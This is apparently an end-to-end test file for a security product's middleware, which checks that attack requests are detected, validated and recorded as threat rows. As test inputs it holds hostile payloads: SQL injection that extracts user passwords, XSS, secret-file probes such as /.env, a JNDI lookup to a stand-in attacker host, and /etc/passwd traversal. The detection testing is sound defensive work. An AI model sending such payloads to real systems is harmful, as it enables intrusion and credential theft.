/**
 * End-to-end: a real Next-style middleware wrapped by the real `withGuard`,
 * real attack traffic driven through it, the real detector, the real runtime
 * client flushing over real HTTP to a real server, and the REAL ingest
 * validator on the other side.
 *
 * Only the database insert is replaced — by an array. Everything between the
 * attacker's request and the row that would be written is shipped code.
 *
 * This matters more here than anywhere else in the product, because the pieces
 * that go wrong are the joins: a payload that the detector catches but the
 * middleware never shows it, a field the SDK sends that the validator rejects,
 * an exclusion rule written for route observation that silently also skips
 * attacks. Unit tests on either side cannot see any of those.
 */
import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import { NextResponse } from 'next/server';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';

import { withGuard, type NextRequestLike } from '../../../packages/runtime-sdk/src/guard/middleware.ts';
import { createRuntime, type RuntimeClient } from '../../../packages/runtime-sdk/src/runtime.ts';
import { validateThreatEvent } from '../lib/runtime/threats/validate.ts';
import type { ThreatEventInput } from '@scanlyfix/db';

const SIGNING_SECRET = 'test-signing-secret';

/** What the ingest endpoint would have written, and what it threw away. */
const stored: ThreatEventInput[] = [];
let rejected = 0;
let routeEventCount = 0;
/** Raw threat payloads as they came off the wire, before validation. */
const onWire: Array<Record<string, unknown>> = [];

function handleIngest(req: IncomingMessage, res: ServerResponse): void {
  let body = '';
  req.on('data', (chunk) => {
    body += chunk;
  });
  req.on('end', () => {
    try {
      const parsed = JSON.parse(body) as { events?: Array<Record<string, unknown>> };
      for (const ev of parsed.events ?? []) {
        if (ev.type !== 'threat') {
          routeEventCount++;
          continue;
        }
        onWire.push(ev);
        // The production validator, not a copy of it.
        const row = validateThreatEvent(ev);
        if (row) stored.push(row);
        else rejected++;
      }
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    } catch {
      res.writeHead(400);
      res.end();
    }
  });
}

let server: Server;
let runtime: RuntimeClient;

beforeAll(async () => {
  server = createServer(handleIngest);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const addr = server.address();
  if (!addr || typeof addr === 'string') throw new Error('no port');
  runtime = createRuntime({
    projectId: '22222222-2222-4222-8222-222222222222',
    ingestUrl: `http://127.0.0.1:${addr.port}/api/runtime/ingest`,
    signingSecret: SIGNING_SECRET,
    // One event per flush, so a test never has to wait for a batch to fill.
    maxBatchSize: 1,
    flushIntervalMs: 10,
  });
});

afterAll(async () => {
  await new Promise<void>((resolve) => server.close(() => resolve()));
});

afterEach(() => {
  stored.length = 0;
  onWire.length = 0;
  rejected = 0;
  routeEventCount = 0;
});

// ── The customer's application ─────────────────────────────────────────────

/** A realistic middleware: turns anonymous visitors away from /admin. */
async function appMiddleware(req: NextRequestLike): Promise<Response> {
  const signedIn = (req.headers.get('cookie') ?? '').includes('session=');
  if (req.nextUrl.pathname.startsWith('/admin') && !signedIn) {
    return new NextResponse('Forbidden', { status: 403 }) as unknown as Response;
  }
  return NextResponse.next() as unknown as Response;
}

type Options = {
  method?: string;
  search?: string;
  userAgent?: string;
  ip?: string;
  headers?: Record<string, string>;
  signedIn?: boolean;
};

function makeRequest(pathname: string, options: Options = {}): NextRequestLike {
  const headers = new Map<string, string>([['host', 'shop.test']]);
  if (options.userAgent) headers.set('user-agent', options.userAgent);
  if (options.ip) headers.set('x-forwarded-for', options.ip);
  if (options.signedIn) headers.set('cookie', 'session=abc');
  for (const [k, v] of Object.entries(options.headers ?? {})) headers.set(k.toLowerCase(), v);

  return {
    nextUrl: { pathname, hostname: 'shop.test', search: options.search ?? '' },
    method: options.method ?? 'GET',
    headers: {
      get: (name: string) => headers.get(name.toLowerCase()) ?? null,
      has: (name: string) => headers.has(name.toLowerCase()),
    },
  };
}

/** Drives one request through the shipped middleware and waits for the flush. */
async function send(pathname: string, options: Options = {}, guardOptions = {}): Promise<Response> {
  const guarded = withGuard(appMiddleware, { runtime, ...guardOptions });
  const response = await guarded(makeRequest(pathname, options));
  await runtime.flush('shop.test');
  return response as Response;
}

// ── Tests ──────────────────────────────────────────────────────────────────

describe('real traffic through the real middleware', () => {
  it('records nothing for people using the site', async () => {
    const ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36';
    await send('/products', { search: '?sort=price&page=2', userAgent: ua, ip: '203.0.113.5' });
    await send('/api/orders/8f1c2b3d-0000-4000-8000-000000000000', { userAgent: ua, ip: '203.0.113.5' });
    await send('/search', { search: "?q=O'Brien%20coffee", userAgent: ua, ip: '203.0.113.5' });

    expect(stored).toEqual([]);
    expect(rejected).toBe(0);
  });

  it('returns the application’s own response untouched', async () => {
    const blocked = await send('/admin/users', { ip: '203.0.113.5' });
    expect(blocked.status).toBe(403);

    const ok = await send('/admin/users', { ip: '203.0.113.5', signedIn: true });
    expect(ok.status).toBe(200);
  });
});

describe('an attack, end to end', () => {
  it('survives the whole chain and arrives as a row', async () => {
    await send('/api/products', {
      search: "?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--",
      ip: '198.51.100.23',
      userAgent: 'sqlmap/1.7.2#stable (http://sqlmap.org)',
    });

    const sqli = stored.find((r) => r.kind === 'sql_injection');
    expect(sqli).toBeTruthy();
    expect(sqli?.severity).toBe('critical');
    expect(sqli?.confidence).toBe('certain');
    expect(sqli?.sourceIp).toBe('198.51.100.23');
    expect(sqli?.pattern).toBe('/api/products');
    expect(sqli?.evidence).toMatch(/union select/i);
    expect(rejected).toBe(0);

    // The tool named itself, and that is a separate finding from the payload.
    expect(stored.some((r) => r.kind === 'scanner')).toBe(true);
  });

  it('reports what the application did about it', async () => {
    await send('/admin/panel', { search: '?q=<script>alert(1)</script>', ip: '198.51.100.24' });
    const xss = stored.find((r) => r.kind === 'xss');
    // The middleware answered 403, and that is worth showing: an attack that
    // bounced reads very differently at 3am from one that did not.
    expect(xss?.blocked).toBe(true);
    expect(xss?.responseStatus).toBe(403);
  });

  it('catches config hunting on paths route observation deliberately ignores', async () => {
    // `.json`, `.txt` and `.xml` are on the route-observation exclusion list, so
    // reusing that list for threat scanning would have made exactly the files
    // worth stealing the ones nobody watched.
    await send('/credentials.json', { ip: '192.0.2.10' });
    await send('/.env', { ip: '192.0.2.10' });
    await send('/.git/config', { ip: '192.0.2.10' });

    expect(stored.filter((r) => r.kind === 'secret_probe')).toHaveLength(3);
  });

  it('sends the route shape, never the identity in the path', async () => {
    await send('/api/users/victim@example.com', { search: '?id=1%20or%201=1', ip: '192.0.2.11' });
    const row = stored.find((r) => r.kind === 'sql_injection');
    expect(row?.pattern).toBe('/api/users/[email]');

    // And nothing anywhere on the wire carried the address.
    expect(JSON.stringify(onWire)).not.toContain('victim@example.com');
  });

  it('catches a payload hidden in a header rather than the URL', async () => {
    await send('/', { ip: '192.0.2.12', headers: { referer: 'https://x.test/?p=${jndi:ldap://evil.example/a}' } });
    expect(stored.some((r) => r.kind === 'code_injection')).toBe(true);
  });

  it('never reads the cookie, whatever is in it', async () => {
    await send('/account', {
      ip: '192.0.2.13',
      signedIn: true,
      headers: { cookie: "session=abc; tracking=<script>alert(1)</script>' UNION SELECT 1--" },
    });
    // A security product that hoovers up its customers' session cookies looking
    // for attacks has become the attack.
    expect(stored).toEqual([]);
    expect(JSON.stringify(onWire)).not.toContain('session=abc');
  });
});

describe('the ingest validator, against what the SDK actually sends', () => {
  it('accepts every field the SDK produces', async () => {
    await send('/api/file', { search: '?name=../../../../etc/passwd', ip: '192.0.2.14' });
    expect(rejected).toBe(0);
    expect(stored).toHaveLength(1);
  });

  it('derives severity itself rather than believing the sender', () => {
    // The request is signed by the customer's app, so the SENDER is authentic —
    // but a compromised or buggy client that could set severity could bury a
    // SQL injection under "medium", or page someone at 3am over a scanner.
    const row = validateThreatEvent({
      type: 'threat',
      kind: 'sql_injection',
      severity: 'medium',
      confidence: 'certain',
      surface: 'query',
      method: 'GET',
      pattern: '/api/x',
      evidence: "1' or 1=1",
      ruleId: 'sqli.tautology',
    });
    expect(row?.severity).toBe('critical');
  });

  it('refuses a kind it does not know', () => {
    expect(
      validateThreatEvent({
        type: 'threat',
        kind: 'made_up_kind',
        confidence: 'certain',
        surface: 'query',
        method: 'GET',
        pattern: '/x',
      }),
    ).toBeNull();
  });

  it('refuses an address that is not an address', () => {
    const row = validateThreatEvent({
      type: 'threat',
      kind: 'xss',
      confidence: 'certain',
      surface: 'query',
      method: 'GET',
      pattern: '/x',
      sourceIp: '<script>alert(1)</script>',
    });
    // The column an operator reads to decide what to block must never hold text.
    expect(row?.sourceIp).toBeNull();
  });

  it('refuses a pattern that is a whole URL rather than a path', () => {
    expect(
      validateThreatEvent({
        type: 'threat',
        kind: 'xss',
        confidence: 'certain',
        surface: 'query',
        method: 'GET',
        pattern: 'https://evil.example/steal',
      }),
    ).toBeNull();
  });

  it('caps evidence and strips control characters from it', () => {
    const row = validateThreatEvent({
      type: 'threat',
      kind: 'xss',
      confidence: 'certain',
      surface: 'query',
      method: 'GET',
      pattern: '/x',
      evidence: `<script>${'A'.repeat(5_000)} </script>`,
    });
    expect(row!.evidence.length).toBeLessThanOrEqual(200);
    expect(row!.evidence).not.toMatch(/[ -]/);
  });

  it('refuses a confidence below the reporting bar', () => {
    expect(
      validateThreatEvent({
        type: 'threat',
        kind: 'xss',
        confidence: 'maybe',
        surface: 'query',
        method: 'GET',
        pattern: '/x',
      }),
    ).toBeNull();
  });

  it('bounds an event count a client claims', () => {
    for (const [claim, expected] of [
      [0, 1],
      [-5, 1],
      [1.5, 1],
      [Number.MAX_SAFE_INTEGER, 100_000],
    ] as const) {
      const row = validateThreatEvent({
        type: 'threat',
        kind: 'auth_attempt',
        confidence: 'certain',
        surface: 'path',
        method: 'POST',
        pattern: '/login',
        count: claim,
      });
      expect(row?.eventCount, String(claim)).toBe(expected);
    }
  });
});

describe('sign-in traffic', () => {
  it('is recorded as an attempt, not as a failure', async () => {
    await send('/api/auth/callback/credentials', { method: 'POST', ip: '198.51.100.30' });
    const row = stored.find((r) => r.kind === 'auth_attempt');
    expect(row).toBeTruthy();
    // Middleware runs before the login handler and cannot know the outcome.
    expect(stored.some((r) => r.kind === 'auth_failure')).toBe(false);
  });

  it('counts every attempt, because the rollup is only as good as the count', async () => {
    for (let i = 0; i < 12; i++) {
      await send('/login', { method: 'POST', ip: '198.51.100.31' });
    }
    const attempts = stored.filter((r) => r.kind === 'auth_attempt');
    expect(attempts).toHaveLength(12);
    expect(attempts.reduce((sum, r) => sum + r.eventCount, 0)).toBe(12);
  });

  it('ignores the sign-in page itself', async () => {
    await send('/login', { method: 'GET', ip: '198.51.100.32' });
    expect(stored).toEqual([]);
  });
});

describe('the guarantees the middleware makes', () => {
  it('can be switched off', async () => {
    await send('/.env', { ip: '192.0.2.20' }, { threats: false });
    expect(stored).toEqual([]);
  });

  it('still lets the application’s error through, and still reports the attack', async () => {
    const guarded = withGuard(
      async () => {
        throw new Error('the application crashed');
      },
      { runtime },
    );
    await expect(guarded(makeRequest('/api/x', { search: "?id=1' or 1=1", ip: '192.0.2.21' }))).rejects.toThrow(
      'the application crashed',
    );
    await runtime.flush('shop.test');

    // A payload that crashes the middleware is more interesting, not less.
    expect(stored.some((r) => r.kind === 'sql_injection')).toBe(true);
  });

  it('never lets a detector failure reach the visitor', async () => {
    // A header accessor that throws models a platform quirk. The page must
    // still render: a security feature that can take a site down is worse than
    // the attacks it watches for.
    const guarded = withGuard(appMiddleware, { runtime });
    const hostile: NextRequestLike = {
      nextUrl: { pathname: '/x', hostname: 'shop.test', search: '?q=1' },
      method: 'GET',
      headers: {
        get: (name: string) => {
          if (name.toLowerCase() === 'referer') throw new Error('boom');
          return null;
        },
        has: () => false,
      },
    };
    const res = (await guarded(hostile)) as Response;
    expect(res.status).toBe(200);
  });

  it('does not stop reporting routes now that it also reports threats', async () => {
    await send('/products', { ip: '203.0.113.9' });
    expect(routeEventCount).toBeGreaterThan(0);
  });
});
